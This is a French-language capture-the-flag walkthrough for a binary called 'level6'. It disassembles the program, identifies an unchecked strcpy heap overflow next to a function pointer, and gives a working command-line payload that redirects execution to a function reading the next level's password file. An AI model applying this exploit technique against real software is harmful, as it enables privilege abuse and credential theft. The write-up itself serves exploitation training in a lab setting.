# Level6

## Démarche

1. **Reconnaissance**

   Lecture du binaire désassemblé :

   ```bash
   objdump -d level6
   ```

   Trois fonctions retiennent l'attention :

   ```x86asm
    08048454 <n>:
    8048454:  movl   $0x80485b0,(%esp)
    8048461:  call   8048370 <system@plt> ; la fonction cible
    ```

    ```x86asm
    08048468 <m>:
    8048468:  movl   $0x80485d1,(%esp)
    8048475:  call   8048360 <puts@plt> ;  la fonction appelée par défaut.
   ```
   
      en utilisant gdb on affiche le contenu de la mémoire à une adresse donnéen, l'adresse memoire juste avant l'appel de la fonction system coresspond a :
    ```gdb
    (gdb)  x/s 0x80485b0
    0x80485b0:       "/bin/cat /home/user/level7/.pass
    ```
    ce sera la commande **system("/bin/cat /home/user/level7/.pass")** qui sera éxécuté si on parvient a remplacer vers ou pointe ptr

2. **Analyse du `main`**

   En retraçant les appels de fonctions dans `main` :

   ```x86asm
   movl   $0x40,(%esp)          ; malloc(64)  → buffer
   call   malloc@plt
   mov    %eax,0x1c(%esp)

   movl   $0x4,(%esp)           ; malloc(4)   → ptr (stocke une adresse de fonction)
   call   malloc@plt
   mov    %eax,0x18(%esp)

   mov    $0x8048468,%edx       ; *ptr = &m   → par défaut, ptr pointe sur m
   mov    0x18(%esp),%eax
   mov    %edx,(%eax)

   mov    0xc(%ebp),%eax        ; argv
   add    $0x4,%eax             ; argv[1]
   mov    (%eax),%eax
   ...
   call   strcpy@plt            ; strcpy(buffer, argv[1])   <- FAILLE

   mov    0x18(%esp),%eax
   mov    (%eax),%eax           ; eax = *ptr
   call   *%eax                 ; appelle la fonction pointee par ptr
   ```

   Observations :
   - Deux allocations : un **buffer de 64 octets** et un bloc de **4 octets** stockant une adresse de fonction (`ptr`).
   - `ptr` est initialisé avec l'adresse de `m` → normalement le programme appelle `m`.
   - `strcpy(buffer, argv[1])` est appelé **entre** l'initialisation de `ptr` et l'appel indirect `call *%eax`.

3. **Faille / principe**

   `strcpy` copie `argv[1]` dans `buffer` **sans vérifier la taille** : c'est un **buffer overflow**.


   Sur le heap, les deux blocs sont adjacents :

   ```
   [ buffer : 64 octets ][ en-tete chunk : 8 octets ][ ptr : 4 octets -> &m ]
   ```
      Offset avant d'atteindre `ptr` : `64 (buffer) + 8 (en-tete du 2e chunk) = 72 octets`.


   L'objectif est d'écrire dans un emplacement mémoire alloué (`ptr`) qui n'était pas censé
   être modifié par l'utilisateur. En débordant depuis `buffer`, on traverse l'en-tête du
   second chunk et on **écrase le contenu de `ptr`** :



4. **Contournement / implémentation**

   Adresse de `n` = `0x08048454`, écrite en **little-endian** : `\x54\x84\x04\x08`.

   Payload : 72 octets de bourrage + l'adresse de `n`.

   ```bash
   ./level6 "$(printf 'Un hacker patient trouve toujours le secret cache au fond de la memoire.\x54\x84\x04\x08')"
   ```

   Le débordement remplace `&m` par `&n` dans `ptr` ; l'appel indirect `call *%eax` exécute
   alors `n`, qui affiche le mot de passe de level7 (avec les droits SUID en exécution normale).